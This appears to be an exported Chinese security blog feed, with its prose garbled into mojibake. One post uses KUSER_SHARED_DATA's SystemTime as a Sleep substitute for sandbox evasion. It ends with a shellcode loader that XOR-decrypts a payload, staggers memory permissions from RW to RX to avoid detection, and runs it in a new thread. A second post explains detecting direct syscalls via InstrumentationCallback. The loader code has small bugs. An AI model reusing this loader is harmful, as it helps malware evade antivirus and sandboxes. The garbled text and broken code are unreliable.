<p>å…¶æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š ã€Œå‘åå…¼å®¹ã€ï¼ˆåœ¨é«˜ç‰ˆæœ¬ä¸‹ åœ¨0x330åä¼šæ·»åŠ ä¸€äº›ç»“æ„ï¼Œåœ¨xpç­‰ç³»ç»Ÿä¸‹ä¸€èˆ¬åªä¼šåˆ°0x330å¤„ï¼‰</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dt _KUSER_SHARED_DATA</span><br><span class="line">ntdll!_KUSER_SHARED_DATA</span><br><span class="line">   +<span class="number">0x000</span> TickCountLowDeprecated : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> TickCountMultiplier : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> InterruptTime    : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x014</span> SystemTime       : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x020</span> TimeZoneBias     : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x02c</span> ImageNumberLow   : Uint2B</span><br><span class="line">   +<span class="number">0x02e</span> ImageNumberHigh  : Uint2B</span><br><span class="line">   +<span class="number">0x030</span> NtSystemRoot     : [<span class="number">260</span>] Wchar</span><br><span class="line">   +<span class="number">0x238</span> MaxStackTraceDepth : Uint4B</span><br><span class="line">   +<span class="number">0x23c</span> CryptoExponent   : Uint4B</span><br><span class="line">   +<span class="number">0x240</span> TimeZoneId       : Uint4B</span><br><span class="line">   +<span class="number">0x244</span> LargePageMinimum : Uint4B</span><br><span class="line">   +<span class="number">0x248</span> AitSamplingValue : Uint4B</span><br><span class="line">   +<span class="number">0x24c</span> AppCompatFlag    : Uint4B</span><br><span class="line">   +<span class="number">0x250</span> RNGSeedVersion   : Uint8B</span><br><span class="line">   +<span class="number">0x258</span> GlobalValidationRunlevel : Uint4B</span><br><span class="line">   +<span class="number">0x25c</span> TimeZoneBiasStamp : Int4B</span><br><span class="line">   +<span class="number">0x260</span> NtBuildNumber    : Uint4B</span><br><span class="line">   +<span class="number">0x264</span> NtProductType    : _NT_PRODUCT_TYPE</span><br><span class="line">   +<span class="number">0x268</span> ProductTypeIsValid : UChar</span><br><span class="line">   +<span class="number">0x269</span> Reserved0        : [<span class="number">1</span>] UChar</span><br><span class="line">   +<span class="number">0x26a</span> NativeProcessorArchitecture : Uint2B</span><br><span class="line">   +<span class="number">0x26c</span> NtMajorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x270</span> NtMinorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x274</span> ProcessorFeatures : [<span class="number">64</span>] UChar</span><br><span class="line">   +<span class="number">0x2b4</span> Reserved1        : Uint4B</span><br><span class="line">   +<span class="number">0x2b8</span> Reserved3        : Uint4B</span><br><span class="line">   +<span class="number">0x2bc</span> TimeSlip         : Uint4B</span><br><span class="line">   +<span class="number">0x2c0</span> AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE</span><br><span class="line">   +<span class="number">0x2c4</span> BootId           : Uint4B</span><br><span class="line">   +<span class="number">0x2c8</span> SystemExpirationDate : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x2d0</span> SuiteMask        : Uint4B</span><br><span class="line">   +<span class="number">0x2d4</span> KdDebuggerEnabled : UChar</span><br><span class="line">   +<span class="number">0x2d5</span> MitigationPolicies : UChar</span><br><span class="line">   +<span class="number">0x2d5</span> NXSupportPolicy  : Pos <span class="number">0</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d5</span> SEHValidationPolicy : Pos <span class="number">2</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d5</span> CurDirDevicesSkippedForDlls : Pos <span class="number">4</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d5</span> Reserved         : Pos <span class="number">6</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d6</span> CyclesPerYield   : Uint2B</span><br><span class="line">   +<span class="number">0x2d8</span> ActiveConsoleId  : Uint4B</span><br><span class="line">   +<span class="number">0x2dc</span> DismountCount    : Uint4B</span><br><span class="line">   +<span class="number">0x2e0</span> ComPlusPackage   : Uint4B</span><br><span class="line">   +<span class="number">0x2e4</span> LastSystemRITEventTickCount : Uint4B</span><br><span class="line">   +<span class="number">0x2e8</span> NumberOfPhysicalPages : Uint4B</span><br><span class="line">   +<span class="number">0x2ec</span> SafeBootMode     : UChar</span><br><span class="line">   +<span class="number">0x2ed</span> VirtualizationFlags : UChar</span><br><span class="line">   +<span class="number">0x2ee</span> Reserved12       : [<span class="number">2</span>] UChar</span><br><span class="line">   +<span class="number">0x2f0</span> SharedDataFlags  : Uint4B</span><br><span class="line">   +<span class="number">0x2f0</span> DbgErrorPortPresent : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgElevationEnabled : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgVirtEnabled   : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgInstallerDetectEnabled : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgLkgEnabled    : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgDynProcessorEnabled : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgConsoleBrokerEnabled : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgSecureBootEnabled : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgMultiSessionSku : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgMultiUsersInSessionSku : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgStateSeparationEnabled : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> SpareBits        : Pos <span class="number">11</span>, <span class="number">21</span> Bits</span><br><span class="line">   +<span class="number">0x2f4</span> DataFlagsPad     : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x2f8</span> TestRetInstruction : Uint8B</span><br><span class="line">   +<span class="number">0x300</span> QpcFrequency     : Int8B</span><br><span class="line">   +<span class="number">0x308</span> SystemCall       : Uint4B</span><br><span class="line">   +<span class="number">0x30c</span> Reserved2        : Uint4B</span><br><span class="line">   +<span class="number">0x310</span> SystemCallPad    : [<span class="number">2</span>] Uint8B</span><br><span class="line">   +<span class="number">0x320</span> TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x320</span> TickCountQuad    : Uint8B</span><br><span class="line">   +<span class="number">0x320</span> ReservedTickCountOverlay : [<span class="number">3</span>] Uint4B</span><br><span class="line">   +<span class="number">0x32c</span> TickCountPad     : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x330</span> Cookie           : Uint4B</span><br><span class="line">   +<span class="number">0x334</span> CookiePad        : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x338</span> ConsoleSessionForegroundProcessId : Int8B</span><br><span class="line">   +<span class="number">0x340</span> TimeUpdateLock   : Uint8B</span><br><span class="line">   +<span class="number">0x348</span> BaselineSystemTimeQpc : Uint8B</span><br><span class="line">   +<span class="number">0x350</span> BaselineInterruptTimeQpc : Uint8B</span><br><span class="line">   +<span class="number">0x358</span> QpcSystemTimeIncrement : Uint8B</span><br><span class="line">   +<span class="number">0x360</span> QpcInterruptTimeIncrement : Uint8B</span><br><span class="line">   +<span class="number">0x368</span> QpcSystemTimeIncrementShift : UChar</span><br><span class="line">   +<span class="number">0x369</span> QpcInterruptTimeIncrementShift : UChar</span><br><span class="line">   +<span class="number">0x36a</span> UnparkedProcessorCount : Uint2B</span><br><span class="line">   +<span class="number">0x36c</span> EnclaveFeatureMask : [<span class="number">4</span>] Uint4B</span><br><span class="line">   +<span class="number">0x37c</span> TelemetryCoverageRound : Uint4B</span><br><span class="line">   +<span class="number">0x380</span> UserModeGlobalLogger : [<span class="number">16</span>] Uint2B</span><br><span class="line">   +<span class="number">0x3a0</span> ImageFileExecutionOptions : Uint4B</span><br><span class="line">   +<span class="number">0x3a4</span> LangGenerationCount : Uint4B</span><br><span class="line">   +<span class="number">0x3a8</span> Reserved4        : Uint8B</span><br><span class="line">   +<span class="number">0x3b0</span> InterruptTimeBias : Uint8B</span><br><span class="line">   +<span class="number">0x3b8</span> QpcBias          : Uint8B</span><br><span class="line">   +<span class="number">0x3c0</span> ActiveProcessorCount : Uint4B</span><br><span class="line">   +<span class="number">0x3c4</span> ActiveGroupCount : UChar</span><br><span class="line">   +<span class="number">0x3c5</span> Reserved9        : UChar</span><br><span class="line">   +<span class="number">0x3c6</span> QpcData          : Uint2B</span><br><span class="line">   +<span class="number">0x3c6</span> QpcBypassEnabled : UChar</span><br><span class="line">   +<span class="number">0x3c7</span> QpcShift         : UChar</span><br><span class="line">   +<span class="number">0x3c8</span> TimeZoneBiasEffectiveStart : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x3d0</span> TimeZoneBiasEffectiveEnd : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x3d8</span> XState           : _XSTATE_CONFIGURATION</span><br><span class="line">   +<span class="number">0x710</span> FeatureConfigurationChangeStamp : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x71c</span> Spare            : Uint4B</span><br></pre></td></tr></table></figure>

<h5 id="SystemTimeå±æ€§"><a href="#SystemTimeå±æ€§" class="headerlink" title="SystemTimeå±æ€§"></a>SystemTimeå±æ€§</h5><p>SystemTimeæ˜¯ä¸€ä¸ª100nsçš„è®¡æ—¶å™¨ï¼Œä»1æœˆ1æ—¥å¼€å§‹è®¡æ—¶</p>
<p>åœ¨åç§»é‡0x14å¤„(0x7FFE0014) è™½ç„¶å¤§å°ä¸º12å­—èŠ‚ ä½†å®é™…æœ‰æ•ˆä¸ºå‰8å­—èŠ‚ï¼ˆHigh1Timeä¸High2Timeç›¸ç­‰ï¼‰</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LARGE_INTEGER time;</span><br><span class="line">time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">time.HighPart = *(<span class="type">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br></pre></td></tr></table></figure>

<p>_KSYSTEM_TIMEç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ntdll!_KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x000</span> LowPart          : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> High1Time        : Int4B</span><br><span class="line">   +<span class="number">0x008</span> High2Time        : Int4B</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_KSYSTEM_TIME</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> LowPart;</span><br><span class="line">     <span class="type">long</span> High1Time;</span><br><span class="line">     <span class="type">long</span> High2Time;</span><br><span class="line">&#125; KSYSTEM_TIME, *PKSYSTEM_TIME;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨å®ƒæ¥ä½œä¸ºsleepçš„æ›¿ä»£æ–¹æ³•</p>
<p>åœ¨Cä¸­å¯ä»¥ä¸é€šè¿‡sleepå‡½æ•°è°ƒç”¨æ¥è·å–æ—¶é—´</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __get_timestamp()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> UNIX_TIME_START = <span class="number">0x019DB1DED53E8000</span>; <span class="comment">// Start of Unix epoch in ticks.</span></span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> TICKS_PER_SECOND = <span class="number">10000000</span>; <span class="comment">// A tick is 100ns.</span></span><br><span class="line">	LARGE_INTEGER time;</span><br><span class="line">	time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">	time.HighPart = *(<span class="type">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LARGE_INTEGER</span> &#123;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">     DWORD LowPart;		<span class="comment">//32ä½æ— ç¬¦å·æ•´æ•° ä½32ä½</span></span><br><span class="line">     LONG  HighPart;	<span class="comment">//32ä¸ºæœ‰ç¬¦å·æ•´æ•° é«˜32ä½</span></span><br><span class="line">    &#125; ;</span><br><span class="line">    __int64 QuadPart;	<span class="comment">// 64ä½æ•´æ•°</span></span><br><span class="line">  &#125; ;</span><br><span class="line">&#125; LARGE_INTEGER, *PLARGE_INTEGER;</span><br></pre></td></tr></table></figure>

<p>UNIX_TIME_STARTä¸ºUnixæ–°çºªå…ƒçš„å¼€å§‹ï¼Œå€¼ä¸º0x019DB1DED53E8000</p>
<p>åªéœ€è¦è¯»å–ShareUserDataä¸­çš„SystemTimeå±æ€§çš„å€¼ï¼Œå‡å»å•ä½æ—¶é—´å¼€å§‹çš„Unixæ—¶é—´ï¼Œåœ¨é™¤ä»¥è®¾å®šçš„ç²¾å‡†åº¦TICKS_PER_SECONDã€‚</p>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html">https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html</a></p>
<p><a href="https://shubakki.github.io/posts/2022/12/detecting-and-evading-sandboxing-through-time-based-evasion/">https://shubakki.github.io/posts/2022/12/detecting-and-evading-sandboxing-through-time-based-evasion/</a></p>
<p>change memory perms like RW -&gt; R -&gt; RX </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;snorlax.h&quot;</span> <span class="comment">// Header file containing our time based evasion stuff</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;utils.h&quot;</span> <span class="comment">// Header file containing RNG related stuff.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERVAL rand() % 26 <span class="comment">// Edit as you wish</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MS_PER_SECOND 1000 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLEEPTIME INTERVAL*MS_PER_SECOND <span class="comment">// Make the use easier</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __get_timestamp()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> UNIX_TIME_START = <span class="number">0x019DB1DED53E8000</span>; <span class="comment">// Start of Unix epoch in ticks.</span></span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> TICKS_PER_MILLISECOND = <span class="number">10000</span>; <span class="comment">// A tick is 100ns.</span></span><br><span class="line">	LARGE_INTEGER time;</span><br><span class="line">	time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">	time.HighPart = *(<span class="type">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __alt_sleepms(<span class="type">size_t</span> ms)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">size_t</span> x = <span class="built_in">rand</span>(); <span class="comment">// random buffer var </span></span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> end = __get_timestamp() + ms; <span class="comment">// calculate when we shall stop sleeping</span></span><br><span class="line">	<span class="keyword">while</span> (__get_timestamp() &lt; end) &#123; x += <span class="number">1</span>; &#125; <span class="comment">// increment random var by 1 till we reach our endtime</span></span><br><span class="line">	<span class="keyword">if</span> (__get_timestamp() - end &gt; <span class="number">2000</span>) <span class="keyword">return</span>; <span class="comment">// Fast Forward check, might need some tuning	</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// seed our generator </span></span><br><span class="line">    <span class="comment">// defaultseed could be any seed you choose</span></span><br><span class="line">    <span class="comment">//but for obvious reasons i recommend using the __TIME__ macro for that.</span></span><br><span class="line">    <span class="built_in">srand</span>( defaultseed ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// initial timeout ? (could be extremely sus)</span></span><br><span class="line">    __alt_sleepms( SLEEPTIME * <span class="number">12</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// decrypt our xor encrypted shellcode</span></span><br><span class="line">    <span class="built_in">xor_bytes</span>( buf, SHELLCODE_SIZE, key, KEYLEN );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate RW memory</span></span><br><span class="line">    PVOID addr = <span class="built_in">VirtualAlloc</span>( <span class="literal">NULL</span>, <span class="built_in">sizeof</span>( buf ), ( MEM_RESERVE | MEM_COMMIT ), PAGE_READWRITE );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy our shellcode to the allocated memory</span></span><br><span class="line">    <span class="built_in">memcpy</span>( addr, buf, <span class="built_in">sizeof</span>( buf ) );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now the interesting part where we can leverage sleeping</span></span><br><span class="line">    <span class="comment">// We basically change memory perms like RW -&gt; R -&gt; RX </span></span><br><span class="line">    <span class="comment">// RWX memory can appear as an IOC</span></span><br><span class="line">    DWORD old_protect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>( addr, <span class="built_in">sizeof</span>( buf ), PAGE_READONLY, &amp;old_protect );</span><br><span class="line"></span><br><span class="line">    __alt_sleepms( SLEEPTIME );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtect</span>( addr, <span class="built_in">sizeof</span>( buf ), PAGE_EXECUTE_READ, &amp;oldProtect );</span><br><span class="line"></span><br><span class="line">    __alt_sleepms( SLEEPTIME );</span><br><span class="line"></span><br><span class="line">    DWORD id;</span><br><span class="line">    HANDLE thread = <span class="built_in">CreateThread</span>( <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;id );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>( thread, INFINITE );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Syscall Detect</title>
    <url>/posts/973bd040/</url>
    <content><![CDATA[<h3 id="Syscallæ£€æµ‹"><a href="#Syscallæ£€æµ‹" class="headerlink" title="Syscallæ£€æµ‹"></a>Syscallæ£€æµ‹</h3><p>åœ¨ntdll.dllä¸­çš„ç³»ç»Ÿè°ƒç”¨ä¸€èˆ¬éƒ½ä¼šéµå¾ªç»“æ„ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov r10, rcx				<span class="comment">// 0x4c, 0x8b, 0xd1</span></span><br><span class="line">mov eax, ã€ŒSyscall Numberã€	<span class="comment">// 0xb8, 0x00, 0x00, 0x00, 0x00</span></span><br><span class="line">syscall						<span class="comment">// 0x0f, 0x05</span></span><br><span class="line">ret							<span class="comment">// 0xc3</span></span><br></pre></td></tr></table></figure>

<p>å½“é€šè¿‡APIè°ƒç”¨Syscallæ—¶ï¼Œæµç¨‹å¦‚ä¸‹æ‰€ç¤º:</p>
<p><img src="/posts/973bd040/1.png" alt="img"></p>
<p>å¯ä»¥è§‚å¯Ÿåˆ°å½“ä»å†…æ ¸è¿”å›è¿›å…¥ç”¨æˆ·æ¨¡å¼ä»£ç æ—¶ï¼ŒRIPåœ¨ntdllä¸­ã€‚åœ¨syscallæŒ‡ä»¤ä¹‹åé€šå¸¸ä¼šæœ‰ä¸€ä¸ªretï¼Œå®ƒè®²æ‰§è¡Œè¿”å›ç»™è°ƒç”¨è€…ã€‚</p>
<p>è€Œå½“ä½¿ç”¨SysWhispersè°ƒç”¨å‡½æ•°æ—¶ï¼ŒsyscallæŒ‡ä»¤ä¼šç›´æ¥åœ¨ç¨‹åºçš„ä¸»æ¨¡å—æ‰§è¡Œï¼Œæµç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="/posts/973bd040/2.png" alt="img"></p>
<h4 id="åˆ©ç”¨InstrumentationCallback"><a href="#åˆ©ç”¨InstrumentationCallback" class="headerlink" title="åˆ©ç”¨InstrumentationCallback"></a>åˆ©ç”¨InstrumentationCallback</h4><p><a href="https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu">https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu</a></p>
<p><a href="https://winternl.com/detecting-manual-syscalls-from-user-mode/">https://winternl.com/detecting-manual-syscalls-from-user-mode/</a></p>
<p><a href="https://pre.empt.blog/2022/implementing-syscall-detection-into-fennec">https://pre.empt.blog/2022/implementing-syscall-detection-into-fennec</a>  </p>
<p>å…·ä½“æ€è·¯ï¼š</p>
<p>åˆ©ç”¨<code>KPROCESS!InstrumentationCallback</code> å­—æ®µåœ¨æ¯æ¬¡æœ‰å†…æ ¸åˆ°ç”¨æˆ·æ¨¡å¼åˆ‡æ¢æ˜¯æ‰§è¡Œå›è°ƒã€‚å…¶ä¸»è¦æ€æƒ³ä¸Šä¿å­˜RIPï¼Œå¹¶å¯¹å…¶è¿›è¡Œåˆ†æï¼Œä»¥ç¡®å®šå½“æ‰§è¡Œè¿”å›åˆ°ç”¨æˆ·æ¨¡å¼æ—¶ï¼Œå®ƒæ˜¯å¦åœ¨ntdll.dllåœ°å€ç©ºé—´ä¸­ã€‚</p>
<p>æ¯å½“å†…æ ¸é‡åˆ°è¿”å›ç”¨æˆ·çº§ä»£ç æ—¶ï¼Œå®ƒéƒ½ä¼šæ£€æŸ¥<code>KPROCESS!InstrumentationCallback</code>æˆå‘˜æ˜¯å¦ä¸ºNULLï¼Œå¦‚æœå®ƒä¸ä¸ºNULLä¸”æŒ‡å‘æœ‰æ•ˆå†…å­˜ï¼Œå†…æ ¸å°†äº¤æ¢æ‰ é™·é˜±å¸§ä¸Šçš„RIPï¼Œå¹¶å°†å…¶æ›¿æ¢ä¸ºInstrumentationCallbackå­—æ®µä¸­å­˜å‚¨çš„å€¼ã€‚</p>
<p>ç›¸å…³é¡¹ç›®ï¼š </p>
<p><a href="https://github.com/jackullrich/syscall-detect">https://github.com/jackullrich/syscall-detect</a></p>
<p><a href="https://github.com/paranoidninja/Process-Instrumentation-Syscall-Hook">https://github.com/paranoidninja/Process-Instrumentation-Syscall-Hook</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">003</span>&gt; dt _kprocess</span><br><span class="line">ntdll!_KPROCESS</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    +<span class="number">0x3d8</span> InstrumentationCallback : Ptr64 Void</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG Version;</span><br><span class="line">    ULONG Reserved;</span><br><span class="line">    PVOID Callback;</span><br><span class="line">&#125; PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, *PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>KPROCESS!InstrumentationCallback å¯é€šè¿‡è°ƒç”¨NtSetInformationProcessæ¥è®¾ç½®</p>
<p>å¯ä»¥ä½¿ç”¨PROCESSINFOCLASS å€¼å’Œä¸€ä¸ªæŒ‡å‘PROCESS_INSTRUMENTATION_CALLBACK_INFORMATIONçš„æŒ‡é’ˆæ¥è°ƒç”¨NtSetInformationProcess</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">NtSetInformationProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG ProcessInfoClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG size</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ProcessInstrumentationCallback  40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG Version;</span><br><span class="line">	ULONG Reserved;</span><br><span class="line">	PVOID Callback;</span><br><span class="line">&#125; PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION Callback = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Callback.Version = <span class="number">0</span>;	<span class="comment">// version 0è¡¨ç¤ºä¸ºx64 1è¡¨ç¤ºä¸ºx86</span></span><br><span class="line">Callback.Reserved = <span class="number">0</span>;	<span class="comment">// reserved always 0</span></span><br><span class="line">Callback.Callback = InstrumentationCallbackThunk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">NtSetInformationProcess</span>(</span><br><span class="line">    <span class="built_in">GetCurrentProcess</span>(),</span><br><span class="line">    (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback,</span><br><span class="line">    &amp;Callback,</span><br><span class="line">    <span class="built_in">sizeof</span>(Callback)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">include ksamd64.inc</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> InstrumentationCallback:proc</span><br><span class="line">EXTERNDEF __imp_RtlCaptureContext:QWORD</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">InstrumentationCallbackThunk proc</span><br><span class="line">				mov     gs:[<span class="number">2e0</span>h], rsp            ; Win10 TEB InstrumentationCallbackPreviousSp</span><br><span class="line">				mov     gs:[<span class="number">2</span>d8h], r10            ; Win10 TEB InstrumentationCallbackPreviousPc</span><br><span class="line">				mov     r10, rcx                  ; Save original RCX</span><br><span class="line">				sub     rsp, <span class="number">4</span>d0h                 ; Alloc stack space <span class="keyword">for</span> CONTEXT structure</span><br><span class="line">				<span class="keyword">and</span>     rsp, <span class="number">-10</span>h                 ; RSP must be <span class="number">16</span> byte aligned before calls</span><br><span class="line">				mov     rcx, rsp</span><br><span class="line">				call    __imp_RtlCaptureContext   ; Save the current <span class="keyword">register</span> state. RtlCaptureContext does <span class="keyword">not</span> require shadow space</span><br><span class="line">				sub     rsp, <span class="number">20</span>h                  ; Shadow space</span><br><span class="line">				call    InstrumentationCallback</span><br><span class="line">				<span class="type">int</span>     <span class="number">3</span></span><br><span class="line">InstrumentationCallbackThunk endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>



